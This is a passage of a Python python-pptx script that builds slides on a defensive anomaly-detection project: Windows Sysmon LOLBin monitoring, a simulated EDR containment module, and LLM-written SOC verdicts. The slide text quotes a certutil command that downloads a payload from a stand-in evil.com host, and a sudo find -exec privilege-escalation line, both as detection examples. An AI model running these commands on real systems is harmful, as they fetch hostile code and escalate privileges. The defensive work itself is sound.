        p_th.font.color.rgb = COLOR_NAVY_MID

        for sub in subitems:
            p_sub = c7_tf.add_paragraph()
            p_sub.alignment = PP_ALIGN.LEFT
            p_sub.text = f"• {sub}"
            p_sub.font.name = FONT_BODY
            p_sub.font.size = Pt(8.5)
            p_sub.font.color.rgb = COLOR_SLATE_BODY
            p_sub.space_before = Pt(2.5)

    card7_r = slide7.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.6), Inches(1.85), Inches(5.933), Inches(4.85)
    )
    card7_r.fill.solid()
    card7_r.fill.fore_color.rgb = COLOR_BG_CARD
    card7_r.line.color.rgb = COLOR_BORDER_CARD
    card7_r.line.width = Pt(1)

    chart7_path = "presentation/assets_simplified/slide6_benchmark_simple.png"
    if os.path.exists(chart7_path):
        slide7.shapes.add_picture(chart7_path, Inches(6.7), Inches(2.0), width=Inches(5.733))

    add_page_decorations(slide7, 7)

    # ==========================================================================
    # SLIDE 8: NEXT STEP - DUAL-OS COVERAGE (WINDOWS SYSMON INTEGRATION)
    # ==========================================================================
    slide8 = prs.slides.add_slide(blank_layout)
    add_header(
        slide8,
        title="Next Step: Dual-OS Coverage (Windows Sysmon Integration)",
        subtitle="Extending behavioral anomaly detection from Linux auditd to Windows endpoint telemetry",
        badge_text="● NEXT STEP: DUAL-OS COVERAGE",
        badge_style="sol"
    )

    # Left Column: Implementation Plan Card
    card8_l = slide8.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.85), Inches(5.6), Inches(4.85)
    )
    card8_l.fill.solid()
    card8_l.fill.fore_color.rgb = COLOR_BG_CARD
    card8_l.line.color.rgb = COLOR_BORDER_CARD
    card8_l.line.width = Pt(1)

    c8_l_tf = card8_l.text_frame
    c8_l_tf.vertical_anchor = MSO_ANCHOR.TOP
    c8_l_tf.margin_left = Inches(0.25)
    c8_l_tf.margin_top = Inches(0.2)
    c8_l_tf.word_wrap = True

    p_8l_h = c8_l_tf.paragraphs[0]
    p_8l_h.alignment = PP_ALIGN.LEFT
    p_8l_h.text = "Heading 1: Dual-OS Coverage (Windows Sysmon Integration)"
    p_8l_h.font.name = FONT_HEADING
    p_8l_h.font.size = Pt(11)
    p_8l_h.font.bold = True
    p_8l_h.font.color.rgb = COLOR_NAVY_DARK

    p_8l_sub = c8_l_tf.add_paragraph()
    p_8l_sub.alignment = PP_ALIGN.LEFT
    p_8l_sub.text = "Expanding our telemetry pipeline to protect both Linux and Windows environments:"
    p_8l_sub.font.name = FONT_BODY
    p_8l_sub.font.size = Pt(9)
    p_8l_sub.font.color.rgb = COLOR_SLATE_MUTED
    p_8l_sub.space_before = Pt(2)

    sysmon_points = [
        ("Implement Windows Sysmon Pipeline:", "Next step is to implement a Windows Sysmon telemetry pipeline to capture endpoint activity alongside Linux auditd."),
        ("Ingest Event ID 1 (Process Creation):", "The goal is to ingest Windows Event ID 1 (Process Creation) to catch Windows LOLBins like 'certutil' and 'powershell'."),
        ("Ingest Event ID 11 (File Creation):", "Correlate suspicious payload staging (e.g. downloads into C:\\Users\\Public or C:\\Windows\\Temp)."),
        ("Cross-Platform Normalization:", "Normalize Windows telemetry (Image, CommandLine, ParentImage, User) into our existing 21-key schema so our Isolation Forest requires zero retraining."),
        ("Target Ubiquitous Native Tools:", "Specifically detect malicious tool abuse without relying on easily bypassed antivirus signatures.")
    ]

    for label, val in sysmon_points:
        p_row = c8_l_tf.add_paragraph()
        p_row.alignment = PP_ALIGN.LEFT
        p_row.text = f"• {label} "
        p_row.font.name = FONT_BODY
        p_row.font.size = Pt(9)
        p_row.font.bold = True
        p_row.font.color.rgb = COLOR_NAVY_MID
        p_row.space_before = Pt(4)

        run = p_row.add_run()
        run.text = val
        run.font.bold = False
        run.font.color.rgb = COLOR_SLATE_BODY

    # Right Column: Target Windows LOLBins Matrix
    card8_r = slide8.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.6), Inches(1.85), Inches(5.933), Inches(4.85)
    )
    card8_r.fill.solid()
    card8_r.fill.fore_color.rgb = COLOR_BG_CARD
    card8_r.line.color.rgb = COLOR_BORDER_CARD
    card8_r.line.width = Pt(1)

    c8_r_tf = card8_r.text_frame
    c8_r_tf.vertical_anchor = MSO_ANCHOR.TOP
    c8_r_tf.margin_left = Inches(0.25)
    c8_r_tf.margin_top = Inches(0.2)
    c8_r_tf.word_wrap = True

    p_8r_h = c8_r_tf.paragraphs[0]
    p_8r_h.alignment = PP_ALIGN.LEFT
    p_8r_h.text = "Target Windows Living-off-the-Land Binaries (LOLBins)"
    p_8r_h.font.name = FONT_HEADING
    p_8r_h.font.size = Pt(11)
    p_8r_h.font.bold = True
    p_8r_h.font.color.rgb = COLOR_NAVY_DARK

    p_8r_sub = c8_r_tf.add_paragraph()
    p_8r_sub.alignment = PP_ALIGN.LEFT
    p_8r_sub.text = "Native Microsoft binaries targeted for behavioral monitoring in Phase 2:"
    p_8r_sub.font.name = FONT_BODY
    p_8r_sub.font.size = Pt(9)
    p_8r_sub.font.color.rgb = COLOR_SLATE_MUTED
    p_8r_sub.space_before = Pt(2)

    lolbin_targets = [
        ("certutil.exe (Ingress Tool Transfer):", "Abused to download payloads via '-urlcache -split -f http://evil.com/payload.exe'. Monitored via Event ID 1 & 11."),
        ("powershell.exe (Execution & Bypass):", "Abused via encoded commands ('-enc') and memory-only downloads to execute unapproved scripts without writing to disk."),
        ("mshta.exe (Scriptlet Proxy Execution):", "Executes remote malicious HTML applications and VBScript/JScript scriptlets, bypassing AppLocker."),
        ("rundll32.exe (Proxy DLL / Scriptlet Execution):", "Executes proxy DLL payloads via control panel applets or inline JavaScript protocol handlers."),
        ("regsvr32.exe (Squiblydoo Technique):", "Abuses COM scriptlets ('scrobj.dll') over HTTP to download and register malicious components silently.")
    ]

    for label, val in lolbin_targets:
        p_row = c8_r_tf.add_paragraph()
        p_row.alignment = PP_ALIGN.LEFT
        p_row.text = f"• {label} "
        p_row.font.name = FONT_BODY
        p_row.font.size = Pt(9)
        p_row.font.bold = True
        p_row.font.color.rgb = COLOR_ACCENT_BLUE
        p_row.space_before = Pt(4)

        run = p_row.add_run()
        run.text = val
        run.font.bold = False
        run.font.color.rgb = COLOR_SLATE_BODY

    add_page_decorations(slide8, 8)

    # ==========================================================================
    # SLIDE 9: NEXT STEP - AUTOMATED EDR ACTIVE RESPONSE MODULE
    # ==========================================================================
    slide9 = prs.slides.add_slide(blank_layout)
    add_header(
        slide9,
        title="Next Step: Automated EDR Active Response Module",
        subtitle="Connecting AI detection verdicts directly to automated host containment and remediation",
        badge_text="● NEXT STEP: ACTIVE RESPONSE",
        badge_style="sol"
    )

    # Left Column: Containment Logic Card
    card9_l = slide9.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.85), Inches(5.6), Inches(4.85)
    )
    card9_l.fill.solid()
    card9_l.fill.fore_color.rgb = COLOR_BG_CARD
    card9_l.line.color.rgb = COLOR_BORDER_CARD
    card9_l.line.width = Pt(1)

    c9_l_tf = card9_l.text_frame
    c9_l_tf.vertical_anchor = MSO_ANCHOR.TOP
    c9_l_tf.margin_left = Inches(0.25)
    c9_l_tf.margin_top = Inches(0.2)
    c9_l_tf.word_wrap = True

    p_9l_h = c9_l_tf.paragraphs[0]
    p_9l_h.alignment = PP_ALIGN.LEFT
    p_9l_h.text = "Heading 2: Automated EDR Active Response Module"
    p_9l_h.font.name = FONT_HEADING
    p_9l_h.font.size = Pt(11)
    p_9l_h.font.bold = True
    p_9l_h.font.color.rgb = COLOR_NAVY_DARK

    p_9l_sub = c9_l_tf.add_paragraph()
    p_9l_sub.alignment = PP_ALIGN.LEFT
    p_9l_sub.text = "Closing the loop between AI alert generation and autonomous incident containment:"
    p_9l_sub.font.name = FONT_BODY
    p_9l_sub.font.size = Pt(9)
    p_9l_sub.font.color.rgb = COLOR_SLATE_MUTED
    p_9l_sub.space_before = Pt(2)

    edr_points = [
        ("Build Active Response Script:", "Next step is to build an Active Response script connected directly to our LLM output (wazuh/active_response.py)."),
        ("Strict Policy Trigger:", "The goal is to automatically simulate killing the malicious process tree (PID) or locking the user account if the JSON dossier flags 'Verdict: Malicious'."),
        ("High-Confidence Safeguard (>= 0.80):", "Mitigation only triggers when Confidence Score >= 0.80, preventing accidental disruption of normal sysadmin tasks."),
        ("Process Tree Termination:", "Simulates terminating the attacker's execution tree: 'kill -9 <PID>' on Linux or 'taskkill /F /T /PID <PID>' on Windows."),
        ("Account Containment:", "Simulates locking the compromised account: 'passwd -l <user>' on Linux or 'net user <user> /active:no' on Windows."),
        ("Persistent Audit Logging:", "Every containment action is timestamped and recorded in 'data/edr_mitigations.log' for forensic accountability.")
    ]

    for label, val in edr_points:
        p_row = c9_l_tf.add_paragraph()
        p_row.alignment = PP_ALIGN.LEFT
        p_row.text = f"• {label} "
        p_row.font.name = FONT_BODY
        p_row.font.size = Pt(9)
        p_row.font.bold = True
        p_row.font.color.rgb = COLOR_NAVY_MID
        p_row.space_before = Pt(3.5)

        run = p_row.add_run()
        run.text = val
        run.font.bold = False
        run.font.color.rgb = COLOR_SLATE_BODY

    # Right Column: Incident-to-Mitigation Workflow
    card9_r = slide9.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.6), Inches(1.85), Inches(5.933), Inches(4.85)
    )
    card9_r.fill.solid()
    card9_r.fill.fore_color.rgb = COLOR_BG_CARD
    card9_r.line.color.rgb = COLOR_BORDER_CARD
    card9_r.line.width = Pt(1)

    c9_r_tf = card9_r.text_frame
    c9_r_tf.vertical_anchor = MSO_ANCHOR.TOP
    c9_r_tf.margin_left = Inches(0.25)
    c9_r_tf.margin_top = Inches(0.2)
    c9_r_tf.word_wrap = True

    p_9r_h = c9_r_tf.paragraphs[0]
    p_9r_h.alignment = PP_ALIGN.LEFT
    p_9r_h.text = "Autonomous Remediation Workflow: Alert to Containment"
    p_9r_h.font.name = FONT_HEADING
    p_9r_h.font.size = Pt(11)
    p_9r_h.font.bold = True
    p_9r_h.font.color.rgb = COLOR_NAVY_DARK

    workflow_steps = [
        ("1. Anomaly Flagged by Isolation Forest", "Unsupervised detector identifies anomalous sliding window pattern (Score: 0.8503)."),
        ("2. LLM Explainer Assesses Threat", "Zero-shot model analyzes command semantics and assigns 'Verdict: Malicious' (Confidence: 95%)."),
        ("3. Active Response Trigger Evaluated", "Script parses the offending Process ID (18452) and Username (attacker) from the LLM dossier."),
        ("4. Simulated Host Containment", "Executes 'kill -9 18452' (kills process tree) and 'passwd -l attacker' (locks user account)."),
        ("5. Forensics & Audit Trail Persisted", "Mitigation event, timestamp, and simulated commands logged to data/edr_mitigations.log.")
    ]

    for step_title, step_desc in workflow_steps:
        p_s = c9_r_tf.add_paragraph()
        p_s.alignment = PP_ALIGN.LEFT
        p_s.text = f"{step_title}"
        p_s.font.name = FONT_BODY
        p_s.font.size = Pt(9)
        p_s.font.bold = True
        p_s.font.color.rgb = BADGE_REAL_TXT
        p_s.space_before = Pt(4)

        p_d = c9_r_tf.add_paragraph()
        p_d.alignment = PP_ALIGN.LEFT
        p_d.text = f"  ➔ {step_desc}"
        p_d.font.name = FONT_BODY
        p_d.font.size = Pt(8.5)
        p_d.font.color.rgb = COLOR_SLATE_BODY
        p_d.space_before = Pt(1)

    add_page_decorations(slide9, 9)

    # ==========================================================================
    # SLIDE 10: THE EXPLAINABILITY (GRAND FINALE)
    # ==========================================================================
    slide10 = prs.slides.add_slide(blank_layout)
    add_header(
        slide10,
        title="AI Explainability: Plain-English Reports for SOC Analysts",
        subtitle="Translating mathematical anomaly scores into clear, human-readable triage summaries in seconds",
        badge_text="● AI EXPLAINABILITY & SOC REPORTING",
        badge_style="sol"
    )

    card10_top = slide10.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(1.85), Inches(11.733), Inches(1.15)
    )
    card10_top.fill.solid()
    card10_top.fill.fore_color.rgb = COLOR_BG_CARD
    card10_top.line.color.rgb = COLOR_BORDER_CARD
    card10_top.line.width = Pt(1)

    c10_top_tf = card10_top.text_frame
    c10_top_tf.vertical_anchor = MSO_ANCHOR.TOP
    c10_top_tf.margin_left = Inches(0.2)
    c10_top_tf.margin_top = Inches(0.12)

    p_10t_h = c10_top_tf.paragraphs[0]
    p_10t_h.alignment = PP_ALIGN.LEFT
    p_10t_h.text = "Why Pairing Anomaly Detection with an LLM Solves the SOC Alert Crisis"
    p_10t_h.font.name = FONT_HEADING
    p_10t_h.font.size = Pt(11.5)
    p_10t_h.font.bold = True
    p_10t_h.font.color.rgb = COLOR_NAVY_DARK

    p_10t_d = c10_top_tf.add_paragraph()
    p_10t_d.alignment = PP_ALIGN.LEFT
    p_10t_d.text = "Traditional ML anomaly models output cryptic mathematical numbers (e.g., 'Score: 0.85, Entropy: 4.8'). Junior SOC analysts cannot easily tell if this is a real hacker or a routine script. Our LLM layer automatically reviews the anomaly features and command history to write a clear, accurate 1-paragraph summary."
    p_10t_d.font.name = FONT_BODY
    p_10t_d.font.size = Pt(9.5)
    p_10t_d.font.color.rgb = COLOR_SLATE_BODY
    p_10t_d.space_before = Pt(3)

    card10_left = slide10.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(0.8), Inches(3.20), Inches(5.7), Inches(3.5)
    )
    card10_left.fill.solid()
    card10_left.fill.fore_color.rgb = RGBColor(248, 250, 252)
    card10_left.line.color.rgb = COLOR_BORDER_CARD
    card10_left.line.width = Pt(1)

    c10_l_tf = card10_left.text_frame
    c10_l_tf.vertical_anchor = MSO_ANCHOR.TOP
    c10_l_tf.margin_left = Inches(0.2)
    c10_l_tf.margin_top = Inches(0.15)

    p_l_h = c10_l_tf.paragraphs[0]
    p_l_h.alignment = PP_ALIGN.LEFT
    p_l_h.text = "What the Machine Detects (Raw Anomaly Data)"
    p_l_h.font.name = FONT_HEADING
    p_l_h.font.size = Pt(11)
    p_l_h.font.bold = True
    p_l_h.font.color.rgb = COLOR_NAVY_MID

    raw_items = [
        ("Flagged Process:", "find (Parent: sudo, User ID: 0 root)"),
        ("Command Line:", "sudo find . -exec /bin/sh -c 'id; echo [Tier1] find exec' \\; -quit"),
        ("Anomaly Score:", "0.8503 (High Outlier, Threshold = 0.50)"),
        ("Sequence Context:", "Elevated randomness; shell invocation token detected"),
        ("Lineage Rarity:", "Rare parent-child pairing (sudo executing find with exec)")
    ]

    for label, val in raw_items:
        p_row = c10_l_tf.add_paragraph()
        p_row.alignment = PP_ALIGN.LEFT
        p_row.text = f"• {label} "
        p_row.font.name = FONT_BODY
        p_row.font.size = Pt(9)
        p_row.font.bold = True
        p_row.font.color.rgb = COLOR_NAVY_DARK
        p_row.space_before = Pt(4)

        run = p_row.add_run()
        run.text = val
        run.font.bold = False
        run.font.color.rgb = COLOR_SLATE_BODY

    card10_right = slide10.shapes.add_shape(
        MSO_SHAPE.ROUNDED_RECTANGLE, Inches(6.8), Inches(3.20), Inches(5.733), Inches(3.5)
    )
    card10_right.fill.solid()
    card10_right.fill.fore_color.rgb = COLOR_BG_CARD
    card10_right.line.color.rgb = BADGE_REAL_LINE
    card10_right.line.width = Pt(1.5)

    c10_r_tf = card10_right.text_frame
    c10_r_tf.vertical_anchor = MSO_ANCHOR.TOP
    c10_r_tf.margin_left = Inches(0.2)
    c10_r_tf.margin_top = Inches(0.15)

    p_r_h = c10_r_tf.paragraphs[0]
    p_r_h.alignment = PP_ALIGN.LEFT
    p_r_h.text = "What the Analyst Sees (Plain-English SOC Verdict)"
    p_r_h.font.name = FONT_HEADING
    p_r_h.font.size = Pt(11)
    p_r_h.font.bold = True
    p_r_h.font.color.rgb = BADGE_REAL_TXT

    llm_items = [
        ("VERDICT:", "Malicious — Privilege Escalation / GTFOBin Abuse"),
        ("ATTRIBUTED TECHNIQUE:", "Abuse Elevation Control Mechanism: Sudo (find -exec)"),
        ("MITRE ATT&CK ID:", "T1548.003 (Privilege Escalation via Sudo)"),
        ("CONFIDENCE SCORE:", "95% (High Confidence)"),
        ("EXPLANATION:", "\"The user executed the 'find' utility with root privileges via sudo and invoked an interactive subshell using the '-exec' flag. This is a classic GTFOBin privilege escalation technique used to break out of restricted shells and obtain root access. Recommended action: Immediately revoke sudo privileges for this user and isolate the host.\"")
    ]

    for label, val in llm_items:
        p_row = c10_r_tf.add_paragraph()
        p_row.alignment = PP_ALIGN.LEFT
        p_row.text = f"{label} "
        p_row.font.name = FONT_BODY
        p_row.font.size = Pt(8.5)
        p_row.font.bold = True
        p_row.font.color.rgb = COLOR_ACCENT_BLUE
        p_row.space_before = Pt(3)

        run = p_row.add_run()
        run.text = val
        run.font.bold = False
        run.font.color.rgb = COLOR_NAVY_DARK

    add_page_decorations(slide10, 10)

    # Save presentation
    os.makedirs(os.path.dirname(output_pptx), exist_ok=True)
    prs.save(output_pptx)
    print(f"[+] Successfully generated Final PowerPoint: {output_pptx}")


if __name__ == "__main__":
    create_final_deck()
